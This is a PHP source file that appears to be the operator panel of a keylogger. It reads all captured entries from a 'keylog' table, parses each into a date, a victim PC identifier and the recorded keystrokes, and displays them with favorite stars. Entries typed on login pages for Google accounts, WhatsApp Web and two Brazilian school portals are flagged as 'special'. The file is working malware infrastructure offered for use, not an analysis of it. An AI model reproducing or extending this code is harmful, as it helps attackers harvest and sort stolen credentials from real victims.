<?php

require_once("../includes/db_connect.php");
require_once("../includes/instruction.php");


$brute_data = $db_instruction->READ_DATA($conn, "SELECT * FROM keylog", NULL, NULL);

foreach ($brute_data as $key => $value) {
    $data_id = $value[0];
    $data_news = $value[1];
    $data_status = $value[2];
   

    $header_and_logs = explode(") ||", $data_news);
    $date_and_pc = explode("||", $header_and_logs[0]);

    $adapt_logs_to_DOM = str_replace("
    ", "<br>", $header_and_logs[1]);


// variables to set values

    $set_class = "default";
    $set_favorite_button_class = "normal";
    $set_star_path = "<img src='./favicon/star_white.svg'>";

    if($data_status === "favorite"){
        $set_favorite_button_class = "active";
        $set_star_path = "<img src='./favicon/star_white_full.svg'>";
    }

    search_in_special_domains($adapt_logs_to_DOM, $set_class);
    write_in_DOM($data_id, $set_class, $date_and_pc, $adapt_logs_to_DOM, $set_favorite_button_class, $set_star_path);

}

function search_in_special_domains($search_in, &$set_class){
    $search_for_domain = array("[[[ PAGE : https://portalsas.com.br/login ]]]", "[[[ PAGE : https://accounts.google.com/","[[[ PAGE : https://siga.activesoft.com.br/login/ ]]]", "[[[ PAGE : https://web.whatsapp.com/ ]]]");

        foreach ($search_for_domain as $key => $value) {
            $verify_domain = substr_count($search_in, $value);
            if($verify_domain >= 1){
                $set_class = "special";
            }
        }
}

function write_in_DOM($data_id, $set_class, $date_and_pc, $adapt_logs_to_DOM, $set_favorite_button_class, $set_star_path){
    echo "<p id='$data_id' class='$set_class'>
    <span class='data'>
        <span class='header_data'>|| <span class='date_header'>$date_and_pc[0]</span> || <span class='pc_identifier'>$date_and_pc[1])</span> ||</span><br><br>
        <span class='content_data'>$adapt_logs_to_DOM</span>
    </span>

    <button class='star_container $set_favorite_button_class'>
    $set_star_path
    </button>
    </p>";
}